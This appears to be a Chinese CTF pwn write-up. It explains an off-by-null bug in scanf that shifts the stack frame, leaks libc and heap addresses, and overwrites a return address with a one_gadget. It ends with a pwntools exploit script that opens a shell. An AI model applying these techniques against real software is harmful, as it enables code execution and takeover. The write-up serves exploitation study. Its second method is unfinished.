## pwn note ##
### 1.题目分析： ###
isoc99\_scanf函数读入结束有两种情形。</br>
1.遇到一些特殊控制字符（如：0x0a,0x0b,0x0c,0x0d,0x20)。</br>
2.读完所有内容。</br>
之后会在末尾字符写入一个'\x00'作为终止字符。</br>
因此，该题目在**edit_note**函数中存在**off by null**漏洞。

### 2.关键地址泄露 ###
具体溢出点如图所示：</br>
![avatar](https://raw.githubusercontent.com/fade-vivida/picture/master/note1.png)</br>
当读入字符串长度为256时，isoc99\_scanf会读入一个'\x00'到末尾，可以看到将会覆盖rbp的最后一个字节，抬高栈帧。

在主函数中，再次调用isoc99\_scanf函数时，由于栈帧被抬高，此时v6(rbp-0x10)已经不在是指向原来的位置，而是指向了之前在edit_note中用户输入数据中。因此我们可以随意控制这个格式化串（使其不再为%d），同理也可以控制参数v7。</br>
![avatar](https://raw.githubusercontent.com/fade-vivida/picture/master/note2.png)</br>
在这有两种利用思路：</br>
1.将v7指向内容修改为某函数的got表地址，那么再次调用命令2(show\_note)，就可以泄露出libc的地址。</br>
2.将v7指向内容修改为hFile，再次调用命令2（show\_note)，泄露出堆地址。

### 3.漏洞利用 ###
两种利用方式：</br>

1.**isoc99\_scanf函数没有cannry保护，isoc99\_scanf函数没有cannry保护，isoc99\_scanf函数没有cannry保护！！！**一个十分重要的点，切记切记。因此，由于此时栈帧被抬高，option变量指向的地址远远高于isoc99\_scanf函数新建立的栈帧，因此读数据时，可以通过覆盖isco99\_scanf函数的返回地址为one_gadget实现程序流控制。<br/>

2.方法2目前无法使用。。。。。。。。。。。。。。。。。。。。。。。。。。。大体思路为：修改格式化串为自己输入的内容，然后可以在栈中写入数据。但目前遇到问题是，栈中空间布局完全无法估计。

### 4.利用代码 ###
```

	def hack():	
		format_s = 0x401129
		puts_got = pwn_elf.got['puts']
		sla('ID:','1'*0x100)
		payload = 'A'*0xa8 + p64(format_s)
		payload = payload.ljust(0x100,'A')
		edit_note(payload)
		
		payload = p32(2) + p64(format_s) + p64(puts_got)
		sla('> ',payload)
		ru('Note:')
		puts_addr = u64(rv(6).ljust(8,'\x00'))
		lg('puts_addr',puts_addr)
		libc.address = puts_addr - libc.symbols['puts']
		lg('libc_addr',libc.address)
		system_addr = libc.symbols['system']
		lg('system_addr',system_addr)
		one_gadget = libc.address + 0x4526a
		
		file = 0x602140
		payload = p32(2) + p64(format_s) + p64(file)
		sla('> ',payload)
		ru('Note:')
		file_ptr = u64(rv(4).ljust(8,'\x00'))
		lg('file_ptr',file_ptr)
		
		#方法1：覆盖scanf函数返回地址为one_gadget
		payload = 'A'*0x64 + p64(one_gadget)
		sla('> ',payload)
		
		#方法2：覆盖scanf函数返回地址为one_gadget
		
		p.interactive()

```